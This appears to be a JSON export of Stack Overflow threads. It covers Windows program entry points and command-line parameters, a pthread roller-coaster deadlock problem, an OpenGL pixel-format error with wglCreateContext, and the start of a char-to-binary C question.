2, "creation_date": 1524641745, "post_id": 50015466, "comment_id": 87049171, "body": "<i>&quot;In Windows all programs really start with the WinMain function.&quot;</i> - That&#39;s not entirely correct. The entry point for all Windows applications is <code>DWORD EntryPoint()</code>. The compiler runtime support library performs its initialization, and dispatches to the correct user-provided entry point. Using default settings and the Microsoft Compiler, there is no <code>WinMain</code> when targeting the <code>CONSOLE</code> subsystem."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 35031, "user_id": 1889329, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/57bec3f0b9c5879cdd9d9fa2e8629318?s=128&d=identicon&r=PG&f=1", "display_name": "IInspectable", "link": "https://stackoverflow.com/users/1889329/iinspectable"}, "edited": false, "score": 1, "creation_date": 1524642424, "post_id": 50015466, "comment_id": 87049582, "body": "@IInspectable Reworded answer, quite considerably."}, {"owner": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "reply_to_user": {"reputation": 35031, "user_id": 1889329, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/57bec3f0b9c5879cdd9d9fa2e8629318?s=128&d=identicon&r=PG&f=1", "display_name": "IInspectable", "link": "https://stackoverflow.com/users/1889329/iinspectable"}, "edited": false, "score": 1, "creation_date": 1524642549, "post_id": 50015466, "comment_id": 87049666, "body": "@IInspectable - yes, in general this is true, but if want be 100% exactly - the signature of exe entry point is <code>DWORD __stdcall EntryPoint(PEB*)</code> but if we use <code>DWORD EntryPoint()</code> - this also will be work without problems"}, {"owner": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "edited": false, "score": 1, "creation_date": 1524642906, "post_id": 50015466, "comment_id": 87049897, "body": "<i>Instead the compiler tells the linker to use a special function</i> - no, usually compiler (say cl.exe) nothing tell the linker about entrypoint/ the <code>&#47;ENTRY</code> this is linker, not compiler option. we direct tell the linker entry point (not via compiler) or linker select it by default based on subsystem"}, {"owner": {"reputation": 82917, "user_id": 3501, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/1fd5f5cc203c393634379a3b3b7e7a87?s=128&d=identicon&r=PG", "display_name": "Anders", "link": "https://stackoverflow.com/users/3501/anders"}, "edited": false, "score": 0, "creation_date": 1524648950, "post_id": 50015466, "comment_id": 87053632, "body": "...<code>EntryPoint</code> should not return, it must call <code>ExitProcess</code>."}, {"owner": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "reply_to_user": {"reputation": 82917, "user_id": 3501, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/1fd5f5cc203c393634379a3b3b7e7a87?s=128&d=identicon&r=PG", "display_name": "Anders", "link": "https://stackoverflow.com/users/3501/anders"}, "edited": false, "score": 0, "creation_date": 1524649332, "post_id": 50015466, "comment_id": 87053874, "body": "@Anders - usual yes, but not mandatory. another thread can call <code>ExitProcess</code>."}, {"owner": {"reputation": 82917, "user_id": 3501, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/1fd5f5cc203c393634379a3b3b7e7a87?s=128&d=identicon&r=PG", "display_name": "Anders", "link": "https://stackoverflow.com/users/3501/anders"}, "edited": false, "score": 0, "creation_date": 1524649744, "post_id": 50015466, "comment_id": 87054180, "body": "It is pretty mandatory that a generic <code>EntryPoint</code> function calls <code>ExitProcess</code>. I don&#39;t even think the PE docs say what happens if you return."}, {"owner": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "reply_to_user": {"reputation": 82917, "user_id": 3501, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/1fd5f5cc203c393634379a3b3b7e7a87?s=128&d=identicon&r=PG", "display_name": "Anders", "link": "https://stackoverflow.com/users/3501/anders"}, "edited": false, "score": 1, "creation_date": 1524650258, "post_id": 50015466, "comment_id": 87054552, "body": "@Anders - the any thread of process can call <code>ExitProcess</code>. absolute not mandatory that this will be the first thread (which started from entry point). what happens if entrypoint return - <code>ExitThread</code> will be called with return value. dont know about docs, what i say is by fact (current implementation in all windows versions)"}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 4, "last_activity_date": 1524642724, "last_edit_date": 1524642724, "creation_date": 1524637985, "answer_id": 50015466, "question_id": 50015387, "link": "https://stackoverflow.com/questions/50015387/unsymmetry-between-main-and-launching-process/50015466#50015466", "title": "Unsymmetry between main and launching process", "body": "<p>On very few system the actual program execution actually start at the <code>main</code> (or <code>WinMain</code>) or similar function. Instead the compiler tells the linker to use a special function which usually doesn't really take <em>any</em> arguments, in the C sense of the word.</p>\n\n<p>The command-line arguments (if <em>any</em>) could be passed through special registers on the assembly level, or they needs to be fetched using special OS-specific functions (like <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms683156(v=vs.85).aspx\" rel=\"nofollow noreferrer\"><code>GetCommandLine</code></a> in the Windows API).</p>\n\n<p>On Windows, the <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms683156(v=vs.85).aspx\" rel=\"nofollow noreferrer\"><code>GetCommandLine</code></a> function does indeed get the command line as a single string. Just like it was passed to e.g. <code>CreateProcess</code>.</p>\n\n<p>For a Windows console program, the special \"entry\" function does some other initialization (like setting up <code>stdin</code> etc.), and then calls <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms683156(v=vs.85).aspx\" rel=\"nofollow noreferrer\"><code>GetCommandLine</code></a> to get the command-line arguments, which it then parses into an array suitable for the <code>main</code> function, which is then called.</p>\n\n<hr>\n\n<p>If you look at the POSIX world (where e.g. Linux and macOS lives) then they have <a href=\"http://man7.org/linux/man-pages/man3/exec.3.html\" rel=\"nofollow noreferrer\">the <code>exec</code> family of functions</a> which does indeed take an array for the arguments. Or a variable-argument list which is parsed into such an array.</p>\n"}], "owner": {"reputation": 4142, "user_id": 2460378, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8195a4ad4c898abfd9544088d62901de?s=128&d=identicon&r=PG", "display_name": "Thomas S.", "link": "https://stackoverflow.com/users/2460378/thomas-s"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "accepted_answer_id": 50015466, "answer_count": 1, "score": 0, "last_activity_date": 1524642724, "creation_date": 1524637671, "last_edit_date": 1524637868, "question_id": 50015387, "link": "https://stackoverflow.com/questions/50015387/unsymmetry-between-main-and-launching-process", "title": "Unsymmetry between main and launching process", "body": "<p>A C main method has the signature</p>\n\n<pre><code>int main(int argc, char** argv) {\n}\n</code></pre>\n\n<p>It will get an array of command line parameters. But when trying to launch an application, e.g. using <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx\" rel=\"nofollow noreferrer\">CreateProcess</a> or <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/bb762153(v=vs.85).aspx\" rel=\"nofollow noreferrer\">ShellExecute</a>, they only accept 2 parameters, one for the application to launch and one for the parameters. <strong>Why the parameters are not specified as array, too?</strong> Why every application that uses other applications has to deal with escaping of command line parameters, e.g., when invoking a compare tool with 2 arbitrary file names that might contain spaces or quotes?</p>\n"}, {"tags": ["c", "multithreading", "concurrency", "deadlock"], "comments": [{"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1524639029, "post_id": 50015315, "comment_id": 87047760, "body": "&quot;using semaphores only&quot;  Hmm, that sounds strange."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1524639199, "post_id": 50015315, "comment_id": 87047847, "body": "You haven&#39;t posted the code that call these functions so it&#39;s difficult to help"}, {"owner": {"reputation": 9, "user_id": 9695435, "user_type": "registered", "profile_image": "https://graph.facebook.com/10212426504640241/picture?type=large", "display_name": "Brian Ha", "link": "https://stackoverflow.com/users/9695435/brian-ha"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1524663907, "post_id": 50015315, "comment_id": 87063902, "body": "@4386427 Updated it a little bit."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1524667077, "post_id": 50015315, "comment_id": 87066123, "body": "You seem to using <code>pthread_cond_wait</code> incorrectly. Read this: <a href=\"https://stackoverflow.com/a/13122435/4386427\">stackoverflow.com/a/13122435/4386427</a>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1524674294, "post_id": 50015315, "comment_id": 87070834, "body": "it is a poor programming practice to <code>#include</code> header files in a header file that does not use the contents of the included header file.  I.E. move the <code>#include</code> statements to the main C file."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1524674729, "post_id": 50015315, "comment_id": 87071025, "body": "the car thread function will NEVER exit  This is an error"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1524674771, "post_id": 50015315, "comment_id": 87071051, "body": "the only way to not have the car load function never hang is to have the capacity of the car set to 1"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1524675022, "post_id": 50015315, "comment_id": 87071163, "body": "regarding: <code>pthread_create(&amp;passengersThreads[i], &amp;threadAttributes, (void*) passengerThreadFunction, (void*)i);</code>  1( always check the returned value from C library functions to assure the operation was successful 2) the variable <code>i</code> is constantly changing so is not a reliable item to pass.  3) the size of a <code>int</code> and the size of a <code>pointer (especially on 64 bit architectures) are not the same so casting a </code>int` to a pointer is not reliable"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1524675701, "post_id": 50015315, "comment_id": 87071507, "body": "mutex&#39;s should be used to protect data that can change asynchronously.  Not on the state of some condition."}], "owner": {"reputation": 9, "user_id": 9695435, "user_type": "registered", "profile_image": "https://graph.facebook.com/10212426504640241/picture?type=large", "display_name": "Brian Ha", "link": "https://stackoverflow.com/users/9695435/brian-ha"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 340, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1524663882, "creation_date": 1524637391, "last_edit_date": 1524663882, "question_id": 50015315, "link": "https://stackoverflow.com/questions/50015315/how-do-i-avoid-occasional-deadlocks-roller-coaster-multithreading", "title": "How do I avoid occasional deadlocks? (Roller Coaster Multithreading)", "body": "<blockquote>\n  <p>The Famous Roller Coaster Problem. Suppose there are n passengers and\n  one roller coaster car. The passengers repeatedly wait to take rides\n  on the car. The car has a capacity of C seats, C &lt; n, but the\n  cheapskate owners won't let the car leave the station until it is\n  full. Write a program to simulate a solution to this problem. Each\n  passenger MUST be a thread that waits to take a ride, waits until the\n  ride completes, disembarks from the ride and exits.</p>\n  \n  <p>The car should be a thread that waits until C passengers enter the car\n  for a ride, then goes around the track for some fixed amount of time\n  (some fixed sleep time), then lets the passengers disembark. It does\n  this until there are no more passengers wanting rides.</p>\n  \n  <p>Your main() thread will perform a pthread_join() on the car thread.\n  When there are no more waiting passenger threads, the car thread exits\n  and thus the main() thread will print something informative and exit.</p>\n  \n  <p>So, suppose the car and each passenger are represented by separate\n  threads. How would you write a program that can simulate this system\n  and fulfill the following requirements:</p>\n  \n  <ol>\n  <li><p>The car always rides with exactly C passengers;</p></li>\n  <li><p>No passengers will jump off the car while the car is running;</p></li>\n  <li><p>No passengers will jump on the car while the car is running;</p></li>\n  </ol>\n  \n  <p>The threads are to synchronize by means of a \"monitor\" (remember, it\n  uses a mutex and a conditional variable to guarantee mutual exclusion)\n  which has three operations: takeRide, loadCustomers, and\n  unloadCustomers. The first operation is called by passengers; a call\n  does not return until the passenger has taken a ride and is ready to\n  leave. The last two operations are called by the car thread. You may\n  add anything else to help your design work.</p>\n</blockquote>\n\n<p><strong>My problem:</strong> These are the functions to be passed into the threads. <code>takeRide</code> is passed into the passenger threads, load and unload are passed into the car thread. First, there are combinations of passengers and car capacity that will not work. For example, a capacity of 2 for the car and 7 passengers. This will be stuck on the last passenger. Secondly, the unboarding doesn't work properly. I don't see the \"passenger x left car.\" How do I fix this issue of it not working for every passenger/capacity combination? Do I need another <code>mutex</code>? Also, why does it just stop running randomly like the sample output below? And how come carUnload doesn't work properly?</p>\n\n<p>Sample deadlock output: capacity=2, passengers=6</p>\n\n<pre><code>Passenger 5 is waiting for car.\nPassenger 4 is waiting for car.\nPassenger 3 is waiting for car.\nPassenger 2 is waiting for car.\nPassenger 1 is waiting for car.\nPassenger 0 is waiting for car.\nCar is waiting for passengers.\nPassenger 4 will take ride in the car\nPassenger 3 will take ride in the car\nPassenger 2 is waiting for car.\nPassenger 1 is waiting for car.\nPassenger 5 is waiting for car.\nPassenger 0 is waiting for car.\n</code></pre>\n\n<p>.h</p>\n\n<pre><code>#include &lt;pthread.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n#include &lt;stdbool.h&gt;\n\nint cap, numPass;\nint passengersInCar;\nbool carIsWaiting; //true if car is waiting for passengers\n\npthread_mutex_t rollerCoasterLock;\npthread_cond_t carLoad;\npthread_cond_t carUnload;\npthread_cond_t carFull;\n</code></pre>\n\n<p>.C</p>\n\n<pre><code>void takeRide(const int passenger_id);\nvoid load();\nvoid unload();\n\n void takeRide(const int passenger_id){\n  pthread_mutex_lock(&amp;rollerCoasterLock);\n  while(!carIsWaiting || passengersInCar==cap){\n    printf(\"Passenger %d is waiting for car.\\n\", passenger_id);\n    pthread_cond_wait(&amp;carLoad, &amp;rollerCoasterLock);\n  }\n  // numPass--;\n  passengersInCar++;\n  printf(\"Passenger %d will take ride in the car\\n\", passenger_id);\n  if (passengersInCar == cap){\n    pthread_cond_broadcast(&amp;carFull);\n    // passengersInCar=0;\n  }\n  pthread_cond_wait(&amp;carFull, &amp;rollerCoasterLock);\n  pthread_cond_wait(&amp;carUnload, &amp;rollerCoasterLock);\n  printf(\"Passenger %d left car.\\n\", passenger_id);\n  pthread_mutex_unlock(&amp;rollerCoasterLock);\n  pthread_exit(0);\n}\n\nvoid load(){\n  pthread_mutex_lock(&amp;rollerCoasterLock);\n  // if(numPass==0)\n  //   pthread_exit(NULL);\n  while(passengersInCar&gt;0){\n    pthread_cond_wait(&amp;carUnload, &amp;rollerCoasterLock);\n  }\n  carIsWaiting = true;\n  pthread_cond_broadcast(&amp;carLoad);\n  printf(\"Car is waiting for passengers.\\n\");\n\n  pthread_cond_wait(&amp;carFull, &amp;rollerCoasterLock);\n  carIsWaiting = false;\n  pthread_cond_broadcast(&amp;carFull);\n  printf(\"Car is full. Going around...\\n\" );\n  pthread_mutex_unlock(&amp;rollerCoasterLock);\n}\n\nvoid unload(){\n  pthread_mutex_lock(&amp;rollerCoasterLock);\n\n  pthread_cond_broadcast(&amp;carUnload);\n  puts(\"unloading...\");\n  passengersInCar=0;\n  pthread_mutex_unlock(&amp;rollerCoasterLock);\n  // pthread_exit(0);\n}\n</code></pre>\n\n<p>Main</p>\n\n<pre><code>#include &lt;pthread.h&gt;\n#include &lt;unistd.h&gt;\n#include \"rollerCoaster.h\"\n\nvoid* carThreadFunction();\nvoid* passengerThreadFunction(int passenger_id);\nvoid testRollerCoasterOneCar(int carCapacity, int numPassengers);\nint cap, numPass;\npthread_attr_t threadAttributes;\n\nint main(int argc, char *argv[]) {\n\n  passengersInCar = 0;\n  carIsWaiting = false;\n  pthread_mutex_init(&amp;rollerCoasterLock, NULL);\n  pthread_cond_init(&amp;carLoad, NULL);\n  pthread_cond_init(&amp;carUnload, NULL);\n  pthread_cond_init(&amp;carFull, NULL);\n  //check command line args\n  if (argc != 3){\n      puts(\"Please enter (car-capacity-num) and (num-of-passengers).\\n\");\n      exit(0);\n  } else {\n    cap = atoi(argv[1]);\n    numPass = atoi(argv[2]);\n  }\n  pthread_attr_init(&amp;threadAttributes);\n    pthread_attr_setscope(&amp;threadAttributes, PTHREAD_SCOPE_SYSTEM);\n\n  testRollerCoasterOneCar(cap, numPass);\n\n  pthread_join(carThread, NULL);\n  puts(\"done\");\n  return 0;\n}\n\nvoid testRollerCoasterOneCar(int carCapacity, int numPassengers) {\n    // rollerCoasterOneCar = new RollerCoasterOneCar(carCapacity);\n\n    pthread_t carThread;\n    pthread_create(&amp;carThread, &amp;threadAttributes, (void*) carThreadFunction, (void*) NULL);\n\n    pthread_t passengersThreads[numPassengers];\n    for (int i = 0; i &lt; numPassengers; i++) {\n        pthread_create(&amp;passengersThreads[i], &amp;threadAttributes, (void*) passengerThreadFunction, (void*)i);\n    }\n}\n\nvoid* carThreadFunction(){\n  while(true){\n    load();\n    usleep(100000);\n    unload();\n  }\n  return NULL;\n}\n\nvoid* passengerThreadFunction(int passenger_id){\n  while(true){\n    takeRide(passenger_id);\n  }\n  return NULL;\n}\n</code></pre>\n"}, {"tags": ["c", "windows", "winapi", "opengl"], "comments": [{"owner": {"reputation": 534, "user_id": 2677528, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dtJK5.png?s=128&g=1", "display_name": "kolrabi", "link": "https://stackoverflow.com/users/2677528/kolrabi"}, "edited": false, "score": 0, "creation_date": 1524662882, "post_id": 50014602, "comment_id": 87063304, "body": "Where are you choosing and setting the pixel format?"}], "answers": [{"comments": [{"owner": {"reputation": 30593, "user_id": 27491, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/48cc12ad73f816bc5b115a9ca6965328?s=128&d=identicon&r=PG", "display_name": "Chris Becke", "link": "https://stackoverflow.com/users/27491/chris-becke"}, "edited": false, "score": 2, "creation_date": 1524760387, "post_id": 50039274, "comment_id": 87112077, "body": "Its worth adding to this that you cannot set the pixel format of the desktop window. You must create your own window."}, {"owner": {"reputation": 2482, "user_id": 9630756, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Zkdcg.png?s=128&g=1", "display_name": "Sergio Monteleone", "link": "https://stackoverflow.com/users/9630756/sergio-monteleone"}, "reply_to_user": {"reputation": 30593, "user_id": 27491, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/48cc12ad73f816bc5b115a9ca6965328?s=128&d=identicon&r=PG", "display_name": "Chris Becke", "link": "https://stackoverflow.com/users/27491/chris-becke"}, "edited": false, "score": 0, "creation_date": 1524762297, "post_id": 50039274, "comment_id": 87113135, "body": "Thanks, I didn&#39;t notice that. I updated my answer accordingly."}], "tags": [], "owner": {"reputation": 2482, "user_id": 9630756, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Zkdcg.png?s=128&g=1", "display_name": "Sergio Monteleone", "link": "https://stackoverflow.com/users/9630756/sergio-monteleone"}, "is_accepted": true, "score": 2, "last_activity_date": 1524762272, "last_edit_date": 1524762272, "creation_date": 1524734359, "answer_id": 50039274, "question_id": 50014602, "link": "https://stackoverflow.com/questions/50014602/wglcreatecontext-fails-with-error-the-pixel-format-is-invalid/50039274#50039274", "title": "wglCreateContext fails with error &quot;The pixel format is invalid&quot;", "body": "<p>You didn't set the pixel format.</p>\n\n<p>Have a look at the documentation <a href=\"https://www.khronos.org/opengl/wiki/Creating_an_OpenGL_Context_(WGL)\" rel=\"nofollow noreferrer\">here</a>.</p>\n\n<p>You should declare a pixel format descriptor, for example:</p>\n\n<pre><code>PIXELFORMATDESCRIPTOR pfd =\n{\n    sizeof(PIXELFORMATDESCRIPTOR),\n    1,\n    PFD_DRAW_TO_WINDOW | PFD_SUPPORT_OPENGL | PFD_DOUBLEBUFFER,    // Flags\n    PFD_TYPE_RGBA,        // The kind of framebuffer. RGBA or palette.\n    32,                   // Colordepth of the framebuffer.\n    0, 0, 0, 0, 0, 0,\n    0,\n    0,\n    0,\n    0, 0, 0, 0,\n    24,                   // Number of bits for the depthbuffer\n    8,                    // Number of bits for the stencilbuffer\n    0,                    // Number of Aux buffers in the framebuffer.\n    PFD_MAIN_PLANE,\n    0,\n    0, 0, 0\n};\n</code></pre>\n\n<p>Then use the <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/dd318284(v=vs.85).aspx\" rel=\"nofollow noreferrer\">ChoosePixelFormat</a> to obtain the pixel format number, e.g.:</p>\n\n<pre><code>int iPixelFormat = ChoosePixelFormat(hdc, &amp;pfd); \n</code></pre>\n\n<p>and finally call the <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/dd369049(v=vs.85).aspx\" rel=\"nofollow noreferrer\">SetPixelFormat</a> function to set the correct pixel format, e.g.:</p>\n\n<pre><code>SetPixelFormat(hdc, iPixelFormat, &amp;pfd);\n</code></pre>\n\n<p>Only then, you can call the <strong>wglCreateContext</strong> function.</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>As pointed out by user <em>Chris Becke</em> one can not call SetPixelFormat on the screen hDC (obtained with GetDC(NULL) as per the OP code). This is reported also in the khronos wiki <a href=\"https://www.khronos.org/opengl/wiki/Platform_specifics:_Windows\" rel=\"nofollow noreferrer\">here</a>.</p>\n\n<p>Therefore, you must also create your own Window, obtain its DC and then use it to set the pixel format and create the GL context. If you want to render \"fullscreen\" you simply have to create a borderless window with the same size of the screen. I suggest to have a look at the answers to <a href=\"https://stackoverflow.com/questions/1400654/how-do-i-put-my-opengl-app-into-fullscreen-mode\">this old question</a> here on SO about this matter.</p>\n"}], "owner": {"reputation": 13, "user_id": 6943103, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-HN8ID87l650/AAAAAAAAAAI/AAAAAAAAAGg/Ppd7hGBCw08/photo.jpg?sz=128", "display_name": "Perpetual Color", "link": "https://stackoverflow.com/users/6943103/perpetual-color"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1373, "favorite_count": 0, "accepted_answer_id": 50039274, "answer_count": 1, "score": 1, "last_activity_date": 1524762272, "creation_date": 1524634003, "last_edit_date": 1524662690, "question_id": 50014602, "link": "https://stackoverflow.com/questions/50014602/wglcreatecontext-fails-with-error-the-pixel-format-is-invalid", "title": "wglCreateContext fails with error &quot;The pixel format is invalid&quot;", "body": "<p>I'm trying to access the entire screen with the context. </p>\n\n<p>Here's my current code (currently only this file):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;Windows.h&gt;\n#include &lt;GL/gl.h&gt;\n#include &lt;gl/glu.h&gt;\n#include &lt;GL/glext.h&gt;\n\nint main(int argc, char *argv[]) {\n    HDC hdc = GetDC(NULL);\n    HGLRC hglrc;\n    hglrc = wglCreateContext(hdc);\n\n    // Handle errors\n    if (hglrc == NULL) {\n        DWORD errorCode = GetLastError();\n        LPVOID lpMsgBuf;\n        FormatMessage(\n            FORMAT_MESSAGE_ALLOCATE_BUFFER |\n            FORMAT_MESSAGE_FROM_SYSTEM |\n            FORMAT_MESSAGE_IGNORE_INSERTS,\n            NULL,\n            errorCode,\n            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),\n            (LPTSTR)&amp;lpMsgBuf,\n            0, NULL );\n        printf(\"Failed with error %d: %s\", errorCode, lpMsgBuf);\n        LocalFree(lpMsgBuf);\n        ExitProcess(errorCode);\n    }\n\n    wglMakeCurrent(hdc, hglrc);\n\n    printf(\"%s\\n\", (char) glGetString(GL_VENDOR));\n\n    wglMakeCurrent(NULL, NULL);\n    wglDeleteContext(hglrc);\n\n    return 0;\n}\n</code></pre>\n\n<p>The problem is in this code at the start:</p>\n\n<pre><code>    HDC hdc = GetDC(NULL);\n    HGLRC hglrc;\n    hglrc = wglCreateContext(hdc);\n</code></pre>\n\n<p>and the program's output (printed in the error handling if statement) is </p>\n\n<pre><code>Failed with error 2000: The pixel format is invalid.\n</code></pre>\n\n<p>Calling GetDC(NULL) is specified as retrieving the DC of the entire screen, so I'm not sure what is going wrong here. How do I fix this?</p>\n\n<p>EDIT: added more information</p>\n"}, {"tags": ["c", "binary", "char"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1524634082, "post_id": 50014591, "comment_id": 87045384, "body": "What do you want to happen with the <code>a</code> here? <code>printf(&quot;Enter char value:&quot;, a);</code>"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1524634144, "post_id": 50014591, "comment_id": 87045407, "body": "If you init <code>a</code> with a recognisable value, is that what gets printed?"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1524634182, "post_id": 50014591, "comment_id": 87045421, "body": "What is the return value of <code>scanf()</code> ?"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 1, "creation_date": 1524634208, "post_id": 50014591, "comment_id": 87045433, "body": "What are you entering as input?"}, {"owner": {"reputation": 15260, "user_id": 1968182, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/E5nF2.jpg?s=128&g=1", "display_name": "Ulrich Eckhardt", "link": "https://stackoverflow.com/users/1968182/ulrich-eckhardt"}, "edited": false, "score": 0, "creation_date": 1524634297, "post_id": 50014591, "comment_id": 87045468, "body": "If hardcoding and entering as input yield different results, have you considered checking whether anything there behaves unexpectedly instead of blaming the conversion to binary?"}, {"owner": {"reputation": 19, "user_id": 9650656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9f9276e297f9e082ccaf4925807ade1?s=128&d=identicon&r=PG&f=1", "display_name": "J.Smith", "link": "https://stackoverflow.com/users/9650656/j-smith"}, "edited": false, "score": 0, "creation_date": 1524634333, "post_id": 50014591, "comment_id": 87045480, "body": "the entered value should be converted to binary and display each bit from sign bit to bit 0"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1524634417, "post_id": 50014591, "comment_id": 87045508, "body": "I understood that, but what is supposed to happen to the variable which gets used in a printf which does not have any reference to any parameter in the format string?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user9601917"}, "edited": false, "score": 0, "creation_date": 1524634453, "post_id": 50014591, "comment_id": 87045522, "body": 